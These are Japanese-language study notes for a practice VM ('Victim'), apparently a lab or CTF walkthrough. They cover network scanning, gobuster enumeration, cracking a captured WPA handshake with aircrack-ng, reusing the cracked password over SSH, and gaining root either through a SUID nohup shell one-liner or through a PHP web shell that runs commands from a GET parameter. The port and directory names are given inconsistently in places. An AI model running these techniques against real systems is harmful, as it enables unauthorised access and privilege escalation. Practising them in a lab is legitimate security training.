## Victim
### 事前準備
  - rockyou.txt.gzファイルを解凍する
  - gunzip /usr/share/wordlists/rockyou.txt.gz 
### ポートスキャンまでは同じ
- `fping`を受け付けないこともあるので、`arp-scan`を使う
  - fpingはicmpプロトコルを飛ばしている
  - arp-scanはarpプロトコルを飛ばしている
  - `sudo arp-scan --localnet`
- 各々ポートのサービスが何で動いている
  - `22` openssh
  - `80` Apache httpd 2.4.29
  - `8080` BusyBox httpd 1.13
  - `8989` bctp
  - `9000` PHP cli server 

### ブラウザで80,8080,8999の各サイトを見てみる
- html,robots.txt

### gobusterで80, 8080を見る   
- `gobuster dir -u 192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50`
  - `-x`のオプションがあると拡張子を指定できる。ただし時間がかかる。表示のProgress(当てはめた数字 / (辞書の数*拡張子の種類数))になるのをチェックする
  - `-u` オプションは、リンクの次から順に検索していく
  - `-t`はスレッドの数を指定できる。デフォルトは10で、50だと３割くらい早くなる
- 8080ポートでもやってみる、この場合はhttp://$IP:8080。するとpasswordsテキストがある。中身を見てみると、、

### pcapファイルを取得
  - pcapファイルを取得する方法は２つある
  1. 8999ポートのブラウザにアクセスする、こういう表示をディレクトリリスティングと呼ぶ。本来はディレクトリなんだが、見やすいようにブラウザが見やすいようにしている
  2. WPA-01.capファイルをダウンロードする。
  3. `wget http://192.168.56.106:8999/WPA-01.cap`

### (補足)wiresharkの設定
- 見やすいようにする
- `view` -> `PacketBytes`のチェックリストを外す 
### wiresharkを起動して中身をチェックする
- `wireshark  WPA-01.cap`とターミナルで入力
- 全体を見るために、Statics -> Protocol Hierarchyを見る、wireless LANとあることからwifiのパケットであることがわかる
- SSIDは無線LANの識別IDで要はユーザ名のことで、ここではdlinkというユーザがいることがわかる
- 暗号化がwpa1で弱いことがわかる

### wiresharkを起動して中身をチェックしてユーザ名を見つける
- 虫メガネアイコンをクリックするとバーが下に出てくる
- Case sensitiveのとこにリストがあるのでDisplay fileterをStringにする
- 右側のとこにSSIDと入力する。SSIDはユーザ名のこと
- ユーザ名のところが青くなる。ユーザ名はdlink

### 暗号解読
- 次の2つは辞書が異なるだけで、どちらでもできる
- 本に書いてるの
  - `aircrack-ng WPA-01.cap -w /usr/share/wordlists/rockyou.txt`
  - パスワードがわかる
- ParrotOSにはwifi専用のパスワード辞書があるので、それでやってみる
  - `aircrack-ng WPA-01.cap -w /usr/share/wordlists/wifite.txt` 
### sshで接続する
- ユーザとwifiのパスワードをsshでも使い回していると仮定してssh接続をする
- `ssh dlink@$IP`

### 侵入
- OSを特定する
- 個人で使える管理者権限を調べる
- ここから攻略1,2がある

### (攻略1)SUIDファイルを特定する
- `find / -perm -4000 -ls 2> /dev/null`
  - `-ls`はロングフォーマットで表示する
- どっちでもいい
- `find / -perm -u=s -type f 2> /dev/null` 

### nohupコマンドでルートシェルを奪う
- `nohup /bin/sh -p -c "sh -p < $(tty) > $(tty) 2> $(tty)"`
  - GTFOBinsのSUIDのところにも書いてある
  - nohupコマンドはターミナルを閉じてもコマンドは継続して実行したいときに使うコマンド
  - -pは実ユーザ(ターミナルを起動したユーザ)と実行ユーザ(コマンドを打ったユーザ)が異なる時につけるオプション。本来は同じになるはずだが、SUIDはルート権限でするので実行ユーザが異なる。`-p`がないと、ルートにはなれない
  - $(tty)はドルパーレンと呼ぶ、単に先にコマンドを実行しているだけ
  - `< $(tty)`標準入力
  - `> $(tty)`標準出力
  - `2> $(tty)`エラー出力
### rootを取得
  - `cd /root`
  - `ls`
  - `cat flag.txt`

## (攻略2)Webシェルでルートフラグを取得
- 書き込み可能なディレクトリを検索する
  - `find / -type d -writable 2> /dev/null`
- フルパーミッションのディレクトリを探す
  - `find / -perm -0777 -type d -ls 2> /dev/null
  - `/var/www/bolt/public/files` このパスに注目する。しかも所有者がrootであることから、rootで実行できる
- ブラウザでチェックする `192.168.56.106:9000` 何が表示される?
- `cd /var/www/bolt/public/files`　に移動する      
- shell.phpファイルを作る `vim shell.php`
```php
<?php
    system($_GET['cmd']);
?>
```
- ブラウザのパスでコマンドを入力することができる
  - 次のコマンドは`cat /root/flag.txt`をすることができる 
  - `view-source:http://192.168.56.106:9000/files/shell.php?cmd=cat /root/flag.txt`
  - ちなみに上のリンクにある`/shell.php?cmd=`は、その上で作ったファイルのこと

## (確認)３つのサイトがどこにあるか？
- `80` Apache httpd 2.4.29
  - `/var/www/joomla` 
- `8080` BusyBox httpd 1.13
  - wwwディレクトリにはない  
- `8989` bctp
  - `/var/www/html` 
- `9000` PHP cli server
  - `/var/www/bold`

 ### Apacheの設定ファイル
 - 本来はポートの設定はsites-availableにあるが、ここでは80しかapacheを使っていないので、80portをjoomlaを使っている
